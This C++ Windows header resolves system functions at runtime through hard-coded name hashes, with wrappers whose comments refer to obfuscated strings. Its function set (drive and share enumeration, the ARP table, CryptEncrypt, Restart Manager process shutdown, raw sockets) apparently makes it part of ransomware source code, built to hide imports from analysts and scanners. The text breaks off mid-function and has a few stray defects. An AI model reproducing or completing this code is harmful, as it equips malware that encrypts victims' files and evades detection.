#pragma once
#include "common.h"
#include <iphlpapi.h>
#include <RestartManager.h>

#define HASHING_SEED 

#define KERNEL32DLL_HASH 0x240dfbc0
#define LOADLIBRARYA_HASH 0xbe3d21a8

enum MODULES {

	KERNEL32_MODULE_ID, 
	ADVAPI32_MODULE_ID,
	NETAPI32_MODULE_ID,
	IPHLPAPI_MODULE_ID,
	RSTRTMGR_MODULE_ID,
	USER32_MODULE_ID,
	WS2_32_MODULE_ID,
	SHLWAPI_MODULE_ID,
	SHELL32_MODULE_ID,
	OLE32_MODULE_ID,
	OLEAUT32_MODULE_ID

};



namespace api {

	VOID DisableHooks();
	BOOL InitializeApiModule();
	BOOL IsRestartManagerLoaded();

	LPVOID
		GetProcAddressEx(
			__in_opt LPCSTR ModuleName,
			__in_opt DWORD ModuleId,
			__in DWORD Hash
		);

	LPVOID
		GetProcAddressEx2(
			__in char* Dll,
			__in DWORD dwModule,
			__in  DWORD dwProcNameHash,
			__in int CacheIndex
		);

}

/*
#pragma region templates

template <DWORD h, DWORD hash, int CacheIndex>
inline LPVOID pushargEx()
{
	typedef LPVOID(WINAPI* newfunc)();
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func();
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A>
inline LPVOID pushargEx(A a1)
{
	typedef LPVOID(WINAPI* newfunc)(A);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B>
inline LPVOID pushargEx(A a1, B a2)
{
	typedef LPVOID(WINAPI* newfunc)(A, B);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C>
inline LPVOID pushargEx(A a1, B a2, C a3)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D, E, F);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D, E, F, G);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D, E, F, G, H);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D, E, F, G, H, I);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D, E, F, G, H, I, X);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
{
	typedef LPVOID(WINAPI* newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
	return NULL;
}

template <DWORD h, DWORD hash, int CacheIndex, class A1, class A2, class A3, class A4, class A5,
	class A6, class A7, class A8, class A9, class A10, class A11, class A12>
	inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
		A9 a9, A10 a10, A11 a11, A12 a12)
{
	typedef LPVOID(WINAPI* newfunc)(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10,
		A11, A12);
	newfunc func = (newfunc)api::GetProcAddressEx2(NULL, h, hash, CacheIndex);
	if (func != NULL)
		return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
	return NULL;
}

#pragma endregion

#pragma region KERNEL32

#define pCancelIo pushargEx<KERNEL32_MODULE_ID, 0x19515ab5, 0>
#define plstrlenW pushargEx<KERNEL32_MODULE_ID, 0x2ffbe59f, 1>
#define pGetLogicalDriveStringsW pushargEx<KERNEL32_MODULE_ID, 0x1b99344d, 2>
#define plstrlenA pushargEx<KERNEL32_MODULE_ID, 0xc65c5ee6, 3>
#define pReadFile pushargEx<KERNEL32_MODULE_ID, 0xf91ac9a0, 4>
#define pGetFileSizeEx pushargEx<KERNEL32_MODULE_ID, 0x1b1acbcc, 5>
#define pGetCurrentProcess pushargEx<KERNEL32_MODULE_ID, 0x663b63f4, 6>
#define pWriteFile pushargEx<KERNEL32_MODULE_ID, 0xc45f4a8c, 7>
#define pWow64DisableWow64FsRedirection pushargEx<KERNEL32_MODULE_ID, 0x1972bf90, 8>
#define pGetProcessId pushargEx<KERNEL32_MODULE_ID, 0x31d910df, 9>
#define pSetEndOfFile pushargEx<KERNEL32_MODULE_ID, 0xede8a61e, 10>
#define pWaitForSingleObject pushargEx<KERNEL32_MODULE_ID, 0x6a095e21, 11>
#define pCreateFileW pushargEx<KERNEL32_MODULE_ID, 0xf06e87ca, 12> !
#define pGetFileAttributesW pushargEx<KERNEL32_MODULE_ID, 0x93afb23a, 13>
#define pSetFileAttributesW pushargEx<KERNEL32_MODULE_ID, 0xa62cc8e1, 14>
#define pWow64RevertWow64FsRedirection pushargEx<KERNEL32_MODULE_ID, 0x78ee4dfa, 15>
#define pGetLastError pushargEx<KERNEL32_MODULE_ID, 0x1fbbb84f, 16>
#define plstrcatW pushargEx<KERNEL32_MODULE_ID, 0x07ba2639, 17>
#define pCloseHandle pushargEx<KERNEL32_MODULE_ID, 0xa5eb6e47, 18>
#define pGetNativeSystemInfo pushargEx<KERNEL32_MODULE_ID, 0xdf1af05e, 19>
#define pSetFilePointerEx pushargEx<KERNEL32_MODULE_ID, 0xd54e6bd3, 20>
#define pCreateProcessW pushargEx<KERNEL32_MODULE_ID, 0x7324a0a2, 21>
#define plstrcpyW pushargEx<KERNEL32_MODULE_ID, 0x4d9702d0, 22>
#define pMoveFileW pushargEx<KERNEL32_MODULE_ID, 0xc8fb7817, 23>
#define pGetCommandLineW pushargEx<KERNEL32_MODULE_ID, 0xd52132a3, 24>
#define pCreateMutexA pushargEx<KERNEL32_MODULE_ID, 0xf701962c, 25>
#define pMultiByteToWideChar pushargEx<KERNEL32_MODULE_ID, 0x0cd05546, 26>
#define pCreateThread pushargEx<KERNEL32_MODULE_ID, 0x3a4532be, 27>
#define plstrcmpiW pushargEx<KERNEL32_MODULE_ID, 0xd72e57a9, 28>
#define pHeapFree pushargEx<KERNEL32_MODULE_ID, 0x3ce51c64, 29>
#define pHeapAlloc pushargEx<KERNEL32_MODULE_ID, 0x263040ab, 30>
#define pGetProcessHeap pushargEx<KERNEL32_MODULE_ID, 0xc5e8a09c, 31>
#define pCreateTimerQueueTimer pushargEx<KERNEL32_MODULE_ID, 0x87b69cc9, 32>
#define pEnterCriticalSection pushargEx<KERNEL32_MODULE_ID, 0x21cca665, 33>
#define pDeleteTimerQueue pushargEx<KERNEL32_MODULE_ID, 0xaf17f6da, 34>
#define pLeaveCriticalSection pushargEx<KERNEL32_MODULE_ID, 0xf99eabb9, 35>
#define pInitializeCriticalSection pushargEx<KERNEL32_MODULE_ID, 0x5d48fbaf, 36>
#define pGetQueuedCompletionStatus pushargEx<KERNEL32_MODULE_ID, 0xcd976938, 37>
#define pExitThread pushargEx<KERNEL32_MODULE_ID, 0xb87c8bb7, 38>
#define pPostQueuedCompletionStatus pushargEx<KERNEL32_MODULE_ID, 0x441bdf1e, 39>
#define pSleep pushargEx<KERNEL32_MODULE_ID, 0xe4b69f3b, 40>
#define pGlobalAlloc pushargEx<KERNEL32_MODULE_ID, 0x55710126, 41>
#define pGlobalFree pushargEx<KERNEL32_MODULE_ID, 0xa0ee5aad, 42>
#define pDeleteCriticalSection pushargEx<KERNEL32_MODULE_ID, 0xf4241d9a, 43>
#define pCreateIoCompletionPort pushargEx<KERNEL32_MODULE_ID, 0x57b499e3, 44>
#define pCreateTimerQueue pushargEx<KERNEL32_MODULE_ID, 0xf05ad6da, 45>
#define pFindFirstFileW pushargEx<KERNEL32_MODULE_ID, 0xe2b40f85, 46>
#define pFindNextFileW pushargEx<KERNEL32_MODULE_ID, 0x9aea18e1, 47>
#define pFindClose pushargEx<KERNEL32_MODULE_ID, 0x75fcf770, 48>
#define plstrcmpW pushargEx<KERNEL32_MODULE_ID, 0x397b11df, 49>
#define pVirtualAlloc pushargEx<KERNEL32_MODULE_ID, 0xd827c1e1, 50>
#define pWaitForMultipleObjects pushargEx<KERNEL32_MODULE_ID, 0x1d7ab241, 51>
#define pGetCurrentProcessId pushargEx<KERNEL32_MODULE_ID, 0x7f0fff4e, 52>
#define pGetModuleHandleW pushargEx<KERNEL32_MODULE_ID, 0xa65b5727, 53>

#pragma endregion

#pragma region ADVAPI32

#define pCryptImportKey pushargEx<ADVAPI32_MODULE_ID, 0xa247ff77, 54>
#define pCryptEncrypt pushargEx<ADVAPI32_MODULE_ID, 0x6c6c937b, 55>
#define pCryptGenRandom pushargEx<ADVAPI32_MODULE_ID, 0xabcb0a67, 56>
#define pCryptAcquireContextA pushargEx<ADVAPI32_MODULE_ID, 0x5cc1ccbc, 57>

#pragma endregion

#pragma region NETAPI32

#define pNetApiBufferFree pushargEx<NETAPI32_MODULE_ID, 0xa1f2bf63, 58>
#define pNetShareEnum pushargEx<NETAPI32_MODULE_ID, 0x1668d771, 59>

#pragma endregion

#pragma region IPHLPAPI

#define pGetIpNetTable pushargEx<IPHLPAPI_MODULE_ID, 0xbf983c41, 60>

#pragma endregion

#pragma region SHELL32

#define pCommandLineToArgvW pushargEx<SHELL32_MODULE_ID, 0xc7dfa7fc, 61>

#pragma endregion 

#pragma region RSTRTMGR 

#define pRmEndSession pushargEx<RSTRTMGR_MODULE_ID, 0x7d154065, 62>
#define pRmStartSession pushargEx<RSTRTMGR_MODULE_ID, 0xb5e437b0, 63>
#define pRmGetList pushargEx<RSTRTMGR_MODULE_ID, 0xbbd8bcb8, 64>
#define pRmRegisterResources pushargEx<RSTRTMGR_MODULE_ID, 0x2ad410e3, 65>
#define pRmShutdown pushargEx<RSTRTMGR_MODULE_ID, 0x22cb760f, 66>

#pragma endregion

#pragma region OLE32

#define pCoUninitialize pushargEx<OLE32_MODULE_ID, 0xd3a7a468, 67>
#define pCoCreateInstance pushargEx<OLE32_MODULE_ID, 0xb32feeec, 68>
#define pCoSetProxyBlanket pushargEx<OLE32_MODULE_ID, 0xde5dbfdc, 69>
#define pCoInitializeSecurity pushargEx<OLE32_MODULE_ID, 0xcc12507f, 70>
#define pCoInitializeEx pushargEx<OLE32_MODULE_ID, 0x2bdbdf4e, 71>

#pragma endregion

#pragma region USER32

#define pwsprintfW pushargEx<USER32_MODULE_ID, 0x2b846b5c, 72>

#pragma endregion

#pragma region SHLWAPI 

#define pStrStrIA pushargEx<SHLWAPI_MODULE_ID, 0x6877b7f6, 73>
#define pStrStrIW pushargEx<SHLWAPI_MODULE_ID, 0x5a8ce5b8, 74>

#pragma endregion

#pragma region WS2_32

#define pgethostbyname pushargEx<WS2_32_MODULE_ID, 0xbd6ac662, 75>
#define pgethostname  pushargEx<WS2_32_MODULE_ID, 0x1260d6db, 76>
#define psocket pushargEx<WS2_32_MODULE_ID, 0x00c1575b, 77>
#define pWSAIoctl pushargEx<WS2_32_MODULE_ID, 0x1ad64c3e, 78>
#define pclosesocket pushargEx<WS2_32_MODULE_ID, 0x4118bcd2, 79>
#define pWSAAddressToStringW pushargEx<WS2_32_MODULE_ID, 0x333230e1, 80>
#define pWSASocketW pushargEx<WS2_32_MODULE_ID, 0xe558706f, 81>
#define pbind pushargEx<WS2_32_MODULE_ID, 0x4310229a, 82>
#define psetsockopt pushargEx<WS2_32_MODULE_ID, 0x55d15957, 83>
#define pgetsockopt pushargEx<WS2_32_MODULE_ID, 0xe34ea561, 84>
#define pshutdown pushargEx<WS2_32_MODULE_ID, 0x61856121, 85>
#define pWSAStartup pushargEx<WS2_32_MODULE_ID, 0xaf724aac, 86>
#define pWSACleanup pushargEx<WS2_32_MODULE_ID, 0x9812c1b7, 87>
#define pInetNtopW pushargEx<WS2_32_MODULE_ID, 0x7e2eafb0, 89>

#pragma endregion
*/

/*

#pragma region KERNEL32

BOOL WINAPI pCancelIo(
	_In_ HANDLE hFile
);

int WINAPI plstrlenW(
	LPCWSTR lpString
);

DWORD WINAPI pGetLogicalDriveStringsW(
	DWORD  nBufferLength,
	LPWSTR lpBuffer
);

int WINAPI plstrlenA(
	LPCSTR lpString
);

BOOL WINAPI pReadFile(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
);

BOOL WINAPI pGetFileSizeEx(
	HANDLE         hFile,
	PLARGE_INTEGER lpFileSize
);

HANDLE WINAPI pGetCurrentProcess();

BOOL WINAPI pWriteFile(
	HANDLE       hFile,
	LPCVOID      lpBuffer,
	DWORD        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped
);

BOOL WINAPI pWow64DisableWow64FsRedirection(
	PVOID* OldValue
);

DWORD WINAPI pGetProcessId(
	HANDLE Process
);

BOOL WINAPI pSetEndOfFile(
	HANDLE hFile
);

DWORD WINAPI pWaitForSingleObject(
	HANDLE hHandle,
	DWORD  dwMilliseconds
);

HANDLE WINAPI pCreateFileW(
	LPCWSTR               lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
);

DWORD WINAPI pGetFileAttributesW(
	LPCWSTR lpFileName
);

BOOL WINAPI pSetFileAttributesW(
	LPCWSTR lpFileName,
	DWORD   dwFileAttributes
);

BOOL WINAPI pWow64RevertWow64FsRedirection(
	PVOID OlValue
);


DWORD WINAPI pGetLastError();

LPWSTR WINAPI plstrcatW(
	LPWSTR  lpString1,
	LPCWSTR lpString2
);

BOOL WINAPI pCloseHandle(
	HANDLE hObject
);

void WINAPI pGetNativeSystemInfo(
	LPSYSTEM_INFO lpSystemInfo
);

BOOL WINAPI pSetFilePointerEx(
	HANDLE         hFile,
	LARGE_INTEGER  liDistanceToMove,
	PLARGE_INTEGER lpNewFilePointer,
	DWORD          dwMoveMethod
);

BOOL WINAPI pCreateProcessW(
	LPCWSTR               lpApplicationName,
	LPWSTR                lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCWSTR               lpCurrentDirectory,
	LPSTARTUPINFOW        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
);

LPWSTR WINAPI plstrcpyW(
	LPWSTR  lpString1,
	LPCWSTR lpString2
);

BOOL WINAPI pMoveFileW(
	LPCWSTR lpExistingFileName,
	LPCWSTR lpNewFileName
);

LPWSTR WINAPI pGetCommandLineW();

HANDLE WINAPI pCreateMutexA(
	LPSECURITY_ATTRIBUTES lpMutexAttributes,
	BOOL                  bInitialOwner,
	LPCSTR                lpName
);

int WINAPI pMultiByteToWideChar(
	UINT                              CodePage,
	DWORD                             dwFlags,
	_In_NLS_string_(cbMultiByte)LPCCH lpMultiByteStr,
	int                               cbMultiByte,
	LPWSTR                            lpWideCharStr,
	int                               cchWideChar
);

HANDLE WINAPI pCreateThread(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
);

int WINAPI plstrcmpiW(
	LPCWSTR lpString1,
	LPCWSTR lpString2
);

BOOL WINAPI pHeapFree(
	HANDLE                 hHeap,
	DWORD                  dwFlags,
	_Frees_ptr_opt_ LPVOID lpMem
);

LPVOID WINAPI pHeapAlloc(
	HANDLE hHeap,
	DWORD  dwFlags,
	SIZE_T dwBytes
);

HANDLE WINAPI pGetProcessHeap();

BOOL WINAPI pCreateTimerQueueTimer(
	PHANDLE             phNewTimer,
	HANDLE              TimerQueue,
	WAITORTIMERCALLBACK Callback,
	PVOID               DueTime,
	DWORD               Period,
	DWORD               Flags,
	ULONG               Parameter
);

void WINAPI pEnterCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
);

BOOL WINAPI pDeleteTimerQueue(
	HANDLE TimerQueue
);

void WINAPI pLeaveCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
);

void WINAPI pInitializeCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
);

BOOL WINAPI pGetQueuedCompletionStatus(
	HANDLE       CompletionPort,
	LPDWORD      lpNumberOfBytesTransferred,
	PULONG_PTR   lpCompletionKey,
	LPOVERLAPPED* lpOverlapped,
	DWORD        dwMilliseconds
);

void WINAPI pExitThread(
	DWORD dwExitCode
);

BOOL WINAPI pPostQueuedCompletionStatus(
	_In_     HANDLE       CompletionPort,
	_In_     DWORD        dwNumberOfBytesTransferred,
	_In_     ULONG_PTR    dwCompletionKey,
	_In_opt_ LPOVERLAPPED lpOverlapped
);

void WINAPI pSleep(
	DWORD dwMilliseconds
);

HGLOBAL WINAPI pGlobalAlloc(
	UINT   uFlags,
	SIZE_T dwBytes
);

HGLOBAL WINAPI pGlobalFree(
	_Frees_ptr_opt_ HGLOBAL hMem
);

void WINAPI pDeleteCriticalSection(
	LPCRITICAL_SECTION lpCriticalSection
);

HANDLE WINAPI pCreateIoCompletionPort(
	_In_     HANDLE    FileHandle,
	_In_opt_ HANDLE    ExistingCompletionPort,
	_In_     ULONG_PTR CompletionKey,
	_In_     DWORD     NumberOfConcurrentThreads
);

HANDLE WINAPI pCreateTimerQueue();

HANDLE WINAPI pFindFirstFileW(
	LPCWSTR            lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
);

BOOL WINAPI pFindNextFileW(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
);

BOOL WINAPI pFindClose(
	HANDLE hFindFile
);

int WINAPI plstrcmpW(
	LPCWSTR lpString1,
	LPCWSTR lpString2
);

LPVOID WINAPI pVirtualAlloc(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

DWORD WINAPI pWaitForMultipleObjects(
	DWORD        nCount,
	const HANDLE* lpHandles,
	BOOL         bWaitAll,
	DWORD        dwMilliseconds
);

DWORD WINAPI pGetCurrentProcessId();

HMODULE WINAPI pGetModuleHandleW(
	LPCWSTR lpModuleName
);



#pragma endregion



#pragma region ADVAPI32


BOOL WINAPI pCryptImportKey(
	HCRYPTPROV hProv,
	const BYTE* pbData,
	DWORD      dwDataLen,
	HCRYPTKEY  hPubKey,
	DWORD      dwFlags,
	HCRYPTKEY* phKey
);

BOOL WINAPI pCryptEncrypt(
	HCRYPTKEY  hKey,
	HCRYPTHASH hHash,
	BOOL       Final,
	DWORD      dwFlags,
	BYTE* pbData,
	DWORD* pdwDataLen,
	DWORD      dwBufLen
);

BOOL WINAPI pCryptGenRandom(
	HCRYPTPROV hProv,
	DWORD      dwLen,
	BYTE* pbBuffer
);

BOOL WINAPI pCryptAcquireContextA(
	HCRYPTPROV* phProv,
	LPCSTR     szContainer,
	LPCSTR     szProvider,
	DWORD      dwProvType,
	DWORD      dwFlags
);


#pragma endregion

#pragma region NETAPI32

DWORD WINAPI pNetApiBufferFree(
	_Frees_ptr_opt_ LPVOID Buffer
);

DWORD WINAPI pNetShareEnum(
	WCHAR*   servername,
	DWORD   level,
	LPBYTE* bufptr,
	DWORD   prefmaxlen,
	LPDWORD entriesread,
	LPDWORD totalentries,
	LPDWORD resume_handle
);

#pragma endregion


ULONG WINAPI pGetIpNetTable(
	PMIB_IPNETTABLE IpNetTable,
	PULONG          SizePointer,
	BOOL            Order
);


LPWSTR* WINAPI pCommandLineToArgvW(_In_ LPCWSTR lpCmdLine, _Out_ int* pNumArgs);

DWORD WINAPI pRmEndSession(
	DWORD dwSessionHandle
);

DWORD WINAPI pRmStartSession(
	DWORD* pSessionHandle,
	DWORD    dwSessionFlags,
	WCHAR* strSessionKey
);

DWORD WINAPI pRmGetList(
	DWORD              dwSessionHandle,
	UINT* pnProcInfoNeeded,
	UINT* pnProcInfo,
	RM_PROCESS_INFO* rgAffectedApps,
	LPDWORD            lpdwRebootReasons
);

DWORD WINAPI pRmRegisterResources(
	DWORD                dwSessionHandle,
	UINT                 nFiles,
	LPCWSTR*           rgsFileNames,
	UINT                 nApplications,
	RM_UNIQUE_PROCESS* rgApplications,
	UINT                 nServices,
	LPCWSTR*           rgsServiceNames
);

DWORD WINAPI pRmShutdown(
	DWORD                    dwSessionHandle,
	ULONG                    lActionFlags,
	RM_WRITE_STATUS_CALLBACK fnStatus
);


void WINAPI pCoUninitialize();

HRESULT WINAPI pCoCreateInstance(
	REFCLSID  rclsid,
	LPUNKNOWN pUnkOuter,
	DWORD     dwClsContext,
	REFIID    riid,
	LPVOID* ppv
);

HRESULT WINAPI pCoSetProxyBlanket(
	IUnknown* pProxy,
	DWORD                    dwAuthnSvc,
	DWORD                    dwAuthzSvc,
	OLECHAR* pServerPrincName,
	DWORD                    dwAuthnLevel,
	DWORD                    dwImpLevel,
	RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
	DWORD                    dwCapabilities
);

HRESULT WINAPI pCoInitializeSecurity(
	PSECURITY_DESCRIPTOR        pSecDesc,
	LONG                        cAuthSvc,
	SOLE_AUTHENTICATION_SERVICE* asAuthSvc,
	void* pReserved1,
	DWORD                       dwAuthnLevel,
	DWORD                       dwImpLevel,
	void* pAuthList,
	DWORD                       dwCapabilities,
	void* pReserved3
);

HRESULT WINAPI pCoInitializeEx(
	LPVOID pvReserved,
	DWORD  dwCoInit
);

hostent* WINAPI pgethostbyname(
	const char* name
);

int WINAPI pgethostname(
	char* name,
	int  namelen
);

SOCKET WINAPI psocket(
	int af,
	int type,
	int protocol
);

int WINAPI pWSAIoctl(
	SOCKET                             s,
	DWORD                              dwIoControlCode,
	LPVOID                             lpvInBuffer,
	DWORD                              cbInBuffer,
	LPVOID                             lpvOutBuffer,
	DWORD                              cbOutBuffer,
	LPDWORD                            lpcbBytesReturned,
	LPWSAOVERLAPPED                    lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
);

int WINAPI pclosesocket(
	IN SOCKET s
);

INT WINAPI pWSAAddressToStringW(
	LPSOCKADDR          lpsaAddress,
	DWORD               dwAddressLength,
	LPWSAPROTOCOL_INFOW lpProtocolInfo,
	LPWSTR              lpszAddressString,
	LPDWORD             lpdwAddressStringLength
);

SOCKET WINAPI pWSASocketW(
	int                 af,
	int                 type,
	int                 protocol,
	LPWSAPROTOCOL_INFOW lpProtocolInfo,
	GROUP               g,
	DWORD               dwFlags
);

int WINAPI pbind(
	SOCKET         s,
	const sockaddr* addr,
	int            namelen
);

int WINAPI psetsockopt(
	SOCKET     s,
	int        level,
	int        optname,
	const char* optval,
	int        optlen
);

int WINAPI pgetsockopt(
	SOCKET s,
	int    level,
	int    optname,
	char* optval,
	int* optlen
);

int WINAPI pshutdown(
	SOCKET s,
	int    how
);

int WINAPI pWSAStartup(
	WORD      wVersionRequired,
	LPWSADATA lpWSAData
);

int WINAPI pWSACleanup();

PCWSTR WSAAPI pInetNtopW(
	INT        Family,
	const VOID* pAddr,
	PWSTR      pStringBuf,
	size_t     StringBufSize
);

PCSTR WINAPI pStrStrIA(
	PCSTR pszFirst,
	PCSTR pszSrch
);

PCWSTR WINAPI pStrStrIW(
	PCWSTR pszFirst,
	PCWSTR pszSrch
);

*/

inline BOOL WINAPI pCancelIo(
	_In_ HANDLE hFile
)
{
	BOOL(WINAPI * pFunction)(HANDLE);
	pFunction = (BOOL(WINAPI*)(HANDLE))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x19515ab5, 0);//GetProcAddress(hKernel32, OBFA("CancelIo"));
	return pFunction(hFile);
}

inline int WINAPI plstrlenW(
	LPCWSTR lpString
)
{
	INT(WINAPI * pFunction)(LPCWSTR);
	pFunction = (INT(WINAPI*)(LPCWSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x2ffbe59f, 1);//GetProcAddress(hKernel32, OBFA("lstrlenW"));
	return pFunction(lpString);
}

inline DWORD WINAPI pGetLogicalDriveStringsW(
	DWORD  nBufferLength,
	LPWSTR lpBuffer
)
{
	DWORD(WINAPI * pFunction)(DWORD, LPWSTR);
	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1b99344d, 2);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));
	return pFunction(nBufferLength, lpBuffer);
}

inline int WINAPI plstrlenA(
	LPCSTR lpString
)
{
	INT(WINAPI * pFunction)(LPCSTR);
	pFunction = (INT(WINAPI*)(LPCSTR))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xc65c5ee6, 3);//GetProcAddress(hKernel32, OBFA("lstrlenA"));
	return pFunction(lpString);
}

inline BOOL WINAPI pReadFile(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xf91ac9a0, 4);//GetProcAddress(hKernel32, OBFA("ReadFile"));
	return pFunction(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

inline BOOL WINAPI pGetFileSizeEx(
	HANDLE         hFile,
	PLARGE_INTEGER lpFileSize
)
{
	BOOL(WINAPI * pFunction)(HANDLE, PLARGE_INTEGER);
	pFunction = (BOOL(WINAPI*)(HANDLE, PLARGE_INTEGER))api::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1b1acbcc, 5);//GetProcAddress(hKernel32, OBFA("GetFileSizeEx"));
	return pFunction(hFile, lpFileSize);
}

inline HANDLE WINAPI pGetCurrentProcess()
{
	HANDLE(WINAPI * pFunction)();
